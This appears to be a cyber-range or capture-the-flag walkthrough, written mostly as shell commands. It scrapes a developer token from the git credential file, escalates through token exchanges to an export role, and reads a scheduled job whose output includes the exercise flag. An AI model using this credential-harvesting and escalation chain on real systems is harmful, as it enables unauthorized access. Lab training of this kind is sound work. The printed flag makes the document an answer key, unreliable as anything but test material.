# K16.1 Walkthrough: Tomorrow's job

Recover the scheduled support workflow and its startup configuration. The read
uses the export role token from the K13.4 -> K14.1 -> K14.2 chain.

## Step 0: open a participant shell

```
gcloud compute ssh <range-vm> --project prod-mgau4w --zone us-central1-a --tunnel-through-iap
sudo docker exec -it --user rowan cinder-keplerops-k-dev bash
```

## Step 1: get the workload token (K13.4)

The developer token is per range. Read it from the git credential store. The POST
mints a real K3s JWT for `svc-fieldlink-workload`.

```
CA=~/.local/share/keplerops/ca.crt
DEV=$(sed -E 's#https://([^@]+)@.*#\1#' ~/.config/git/credentials)
WORKLOAD=$(curl -sS --cacert $CA -u "$DEV" \
  -H 'Content-Type: application/json' -d '{}' \
  https://cloud-api.keplerops.test/api/workspaces/current/token-exchange \
  | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
```

## Step 2: exchange for the export role token (K14.1 + K14.2)

```
curl -sS --cacert $CA -H "Authorization: Bearer $WORKLOAD" \
  https://cloud-api.keplerops.test/api/trust-records/TRUST-FLX-04
ROLE=$(curl -sS --cacert $CA -H "Authorization: Bearer $WORKLOAD" \
  -H 'Content-Type: application/json' -d '{}' \
  https://cloud-api.keplerops.test/api/token-exchange/support-export-editor \
  | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
```

## Step 3: read the schedule (K16.1 acceptance check)

cloud-api reads the real K3s CronJob `sched-2841` with its own K3s identity after
it validates the role token.

```
curl -sS --cacert $CA -H "Authorization: Bearer $ROLE" \
  https://workloads.keplerops.test/api/schedules/SCHED-2841
```

Output:

```json
{"allowed_startup_hooks":[{"argv":["fk-support-export","--export","EXP-2841"]}],"assignment":"CAS-MAYA-2841","case_id":"CAS-MAYA-2841","cron":"0 8 * * *","destination":"fieldkest-exports","flag":"FLAG{25a027fe80e77ca0}","next_assignment":"field-operator-b","profile":"support-export","schedule_id":"SCHED-2841","schema":"fieldkest.schedule/v1","startup_config":"EXP-2841","startup_hook":null}
```

Values used next: `allowed_startup_hooks[0].argv` (K16.2), `next_assignment`
(K16.4).
